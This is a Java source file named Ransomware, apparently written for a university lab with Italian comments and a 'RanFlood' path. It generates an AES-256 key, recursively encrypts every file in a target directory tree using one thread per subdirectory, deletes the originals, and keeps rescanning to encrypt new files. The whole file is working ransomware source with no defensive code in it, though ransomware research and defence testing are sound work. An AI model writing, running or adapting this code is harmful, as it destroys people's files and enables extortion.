import java.io.*;
import java.nio.file.Files;
import java.util.*;
import javax.crypto.*;


public class Ransomware {

	private static final String floodingPath = "/home/studente/Desktop/RanFlood/Flooding";
	private static final long bigFileDimension = 50000000;
	private static final int BUFFER_SIZE = 4096; // 4KB
	
	public static void main(String[] args) {

		File dir = new File(args[0]);
		
		if( !dir.isDirectory()) {
			System.out.println("Not a directory");
			System.exit(-1);
		}
		

		//Generate secretKey
		KeyGenerator keyGen = null;
		try {
			keyGen = KeyGenerator.getInstance("AES");
		}catch (Exception e) {
			System.out.println("Impossibile generare keyGenerator");
			System.exit(0);
		}
		keyGen.init(256);
		
		SecretKey secretKey = keyGen.generateKey();
		
		//Convert secretKey to String
		
		byte []encoded = secretKey.getEncoded();
		String encodedKey = Base64.getEncoder().encodeToString(encoded);
		
		//Save secretKey
		try {
		File file = new File("/home/studente/Desktop/RanFlood/secretKey.txt");
		FileWriter fw = new FileWriter(file);
		fw.write(encodedKey);
		fw.close();
		}catch (IOException e) {
			System.out.println("Errore salvataggio della chiave");
			System.exit(-1);
		}
		//Use the same secretKey for all the files
		
		loopFile(dir,null,secretKey);
		
		
		

	}
	


	public static void loopFile(File dir, Set<String> encryptedFileSet,SecretKey secretKey) {
		File [] listFile = dir.listFiles();
		
		if(encryptedFileSet == null) {
			//Prima volta
			encryptedFileSet = new HashSet<String>();
			
			for(int i  =0 ; i < listFile.length; i++) {
				
				if(listFile[i].isDirectory() && listFile[i].getName() != "." && listFile[i].getName() != ".." ) { 
					
					System.out.println("Creazione nuovo figlio per dir : " + listFile[i].getAbsolutePath());
					RansomwareChild child = new RansomwareChild(listFile[i].getAbsoluteFile(),secretKey);
					new Thread(child).start();
					
				}else { // Crypt
					
					//encryptFile deve ritornare il nome del file criptato cosi da aggiungerlo -> null se non ci è riuscito
					
					String newEncryptedFilePath = Ransomware.encryptFile(listFile[i],secretKey);
					if(newEncryptedFilePath == null) {
						//Failure encrypting 
					}else {
						encryptedFileSet.add(newEncryptedFilePath);
					}
				}
			}
			
		}else {
			//Seconda volta quindi ci sono file che sono cambiati nel tempo quindi critto solo quelli
			for(File file : listFile) {
				if(!encryptedFileSet.contains(file.getAbsolutePath()) && !file.isDirectory()) {
					String newEncryptedFilePath = Ransomware.encryptFile(file,secretKey);
					if(newEncryptedFilePath != null)
						encryptedFileSet.add(newEncryptedFilePath); //Aggiungo il file dopo averlo criptato
				}
			}
		}
		
		
		//Ri-leggo tutti i file
		//Non posso ricrittarli qui perchè i nomi possono cambiare anche quando sono qui quindi devo ricontrollarli -> ricorsione con loopFile
		listFile = dir.listFiles();
		System.out.println("\n WAIT \n");
		try {
			Thread.sleep(1000);
		}catch (Exception e) {
			e.printStackTrace();
			System.exit(-1);
		}
		System.out.println("\nCheck for files variations\n");

		System.out.println("File in dir : ");
		for(File f : listFile) {
			System.out.println(f.getAbsolutePath());
		}
		System.out.println("File in set : "+ encryptedFileSet.toString());
		for(File file : listFile) {
			if(!encryptedFileSet.contains(file.getAbsolutePath()) && file.isFile()) {
				System.out.println("\n FILE CAMBIATI RIPARTO \n");
				loopFile(dir,encryptedFileSet,secretKey);
			}
		}
		System.out.println("End encrypting on " +dir.getAbsolutePath());
	
		
	}
	
	//Metodo non usato per cifrare file di grandi dimensioni 
	public static void canEncrypt(File file,SecretKey secretKey) {
		if(file.length() >= bigFileDimension) {
			
			//File troppo grande --> creo un figlio
			System.out.println("Creazione nuovo figlio per file grande : "+ file.getAbsolutePath());
			RansomwareChildBigFile rcbf = new RansomwareChildBigFile(file,secretKey);
			new Thread(rcbf).start();
			
		}else {
			
			//Critto il file
			Ransomware.encryptFile(file,secretKey);
		}
	}

	public static String encryptFile(File file, SecretKey secretKey) {
		Cipher cipher = null;
		try {
			cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
			cipher.init(Cipher.ENCRYPT_MODE,secretKey);
		}catch (Exception e) {
			System.out.println("Errore creazioen cipher");
			System.exit(-2);
		}

			try {
			System.out.println("Encrypting"+ file.getAbsolutePath());

			/******* <Read Bytes > *****/
			
			FileInputStream ins = new FileInputStream(file);
			File encryptedFile = new File(file.getAbsolutePath()+".enc");
			OutputStream outs = new FileOutputStream(encryptedFile);
			byte []buffer = new byte[BUFFER_SIZE];
			
			while(ins.read(buffer) != -1) {
				outs.write(cipher.doFinal(buffer));
			}
			
			/****** </Read Bytes > ******/ 
			ins.close();
			outs.close();
			file.delete();
			
			
			System.out.println(encryptedFile.getAbsolutePath()+ " Encrypted");
			return encryptedFile.getAbsolutePath();
		}catch (Exception e) {
			System.out.println("Eccezione con" + file.getAbsolutePath() +" continuo");
			e.printStackTrace();
			return null;
		}
	}

	
}
	


	class RansomwareChild implements Runnable{
	
		private File dir;
		private SecretKey secretKey;
		
		public RansomwareChild(File dir, SecretKey secretKey) {
			this.dir = dir;
			this.secretKey = secretKey;
		}
		@Override
		public void run() {
			Ransomware.loopFile(this.dir,null,this.secretKey);
		}
	
	}
	
	//Non usato
	class RansomwareChildBigFile implements Runnable{
		private File file;
		private SecretKey secretKey;
		
		public RansomwareChildBigFile(File file, SecretKey secretKey) {
			this.file = file;
			this.secretKey = secretKey;
		}
		
		@Override
		public void run() {
			String encryptedFilePath = Ransomware.encryptFile(this.file,this.secretKey);
			if(encryptedFilePath != null ) {
				System.out.println("Big file encryption success : "+encryptedFilePath);
			}else {
				System.out.println("Big file encryption failure : "+encryptedFilePath);
			}
		}
	}




































//